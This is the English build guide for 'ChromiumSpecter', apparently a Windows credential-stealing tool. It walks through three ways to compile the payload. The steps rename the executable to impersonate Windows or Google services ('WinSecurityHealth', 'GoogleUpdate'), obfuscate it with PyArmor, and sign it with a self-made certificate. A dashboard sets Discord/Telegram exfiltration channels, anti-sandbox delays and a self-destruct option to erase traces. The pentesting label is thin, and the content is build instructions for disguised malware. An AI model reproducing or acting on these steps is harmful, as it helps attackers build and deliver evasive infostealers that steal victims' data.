# ⚙️ Professional Compilation Flows

> [!NOTE]
> **English Version** | [Versión en Español](COMPILATION_FLOWS.md)

This guide details the two recommended workflows for generating the final **ChromiumSpecter** executable, covering both hybrid environments and pure Linux/WSL environments.

---

## 🏗️ Flow A: Hybrid (Windows + WSL/Linux)

**Recommended for: Maximum stability and ease of use.**

This flow uses Windows for the heavy compilation part (where native APIs are present) and WSL/Linux for the security and stealth part (digital signing).

### 1. Preparation on Windows (PowerShell)

Install the necessary dependencies:

```powershell
pip install pyarmor pyinstaller -r requirements.txt
```

### 2. Binary Compilation (Windows)

Generate the `.exe` using the automation script with identity spoofing (e.g., mimicking a Windows service):

```powershell
python build.py --name "WinSecurityHealth" --preset microsoft --onefile --noconsole
```

*The result will be in `dist/ChromiumSpecter.exe`.*

### 3. Digital Signing (WSL/Linux)

Copy the file to your WSL environment and run the certification script:

```bash
bash autocert.sh dist/ChromiumSpecter.exe "YourSecurePassword"
```

---

## 🏗️ Flow B: Pure (WSL/Linux with Wine)

**Recommended for: Pentesting from isolated environments or distributions like Kali Linux.**

This flow allows generating a Windows executable without leaving Linux, emulating the Windows environment using Wine.

### 1. Wine Prefix Configuration

Create a clean 64-bit environment to avoid conflicts:

```bash
export WINEPREFIX=$HOME/.wine_chromium
export WINEARCH=win64
winecfg  # Ensure the Windows version is set to 'Windows 10'
```

### 2. Python Installation for Windows in Wine

Download the official Windows installer (`python-3.x-amd64.exe`) from python.org and run it:

```bash
wine python-3.11.x-amd64.exe /quiet InstallAllUsers=1 PrependPath=1
```

### 3. Dependency Installation inside Wine

Use the emulated `pip` to install the Windows libraries:

```bash
wine python -m pip install --upgrade pip
wine python -m pip install pycryptodomex pywin32 requests pyarmor pyinstaller
```

> [!IMPORTANT]
> If `pywin32` fails, run this post-installation command:
> `wine python Scripts/pywin32_postinstall.py -install`

### 4. Metamorphic Compilation

Run the entire process under Wine:

```bash
wine python ofuscator.py main.py
wine python build.py --name "GoogleUpdate" --preset google --onefile --noconsole
```

### 5. In-Situ Signing

Sign the binary directly from your Linux terminal:

```bash
bash autocert.sh dist/ChromiumSpecter.exe
```

## 🎛️ Flow C: Dashboard Builder (Recommended)

This is the easiest and most powerful method, using the integrated graphical interface to configure and generate the executable.

### Steps

1. **Exfiltration Tab**: Configure and verify your channels (Discord/Telegram). Save the settings.
2. **Compilation Tab (Builder)**:
    * **Metadata**: Define the executable name, company, version, and icon.
    * **Stealth**: Configure Delays (Anti-Sandbox) and Webhook Timeout.
    * **Options**: Enable **Obfuscation (PyArmor)** for maximum protection or **Self-Destruct** to erase traces.
3. **Build**: Press `🔨 START COMPILATION`. The Dashboard will use its internal engine to generate the file in the `dist/` folder.

> [!TIP]
> The Master Dashboard carries its own injected compilation engine. This allows generating stubs even if you don't have Python installed on the global system.

---

## 🛡️ Flows Comparison

| Feature | Flow A (Hybrid) | Flow B (Wine) | Flow C (Dashboard) |
| :--- | :--- | :--- | :--- |
| **Stability** | ⭐ Excellent | ⚠️ Moderate | ⭐ Excellent |
| **Simplicity** | ⭐ High | ⚠️ Low | 🏆 Maximum |
| **Isolation** | ❌ Low | ⭐ High | 🟡 Medium |
| **Build Size** | ~18 MB | ~18 MB | ~18 MB |
| **Portability** | Medium (Repo) | High (Linux) | 🚀 Total (Standalone) |

---

## ⚖️ Pentesting Recommendation

If you are operating from an attack machine (Kali Linux), **Flow B** allows you to keep your entire supply chain inside Linux, minimizing the exposure of your development tools on Windows systems that might be monitored.


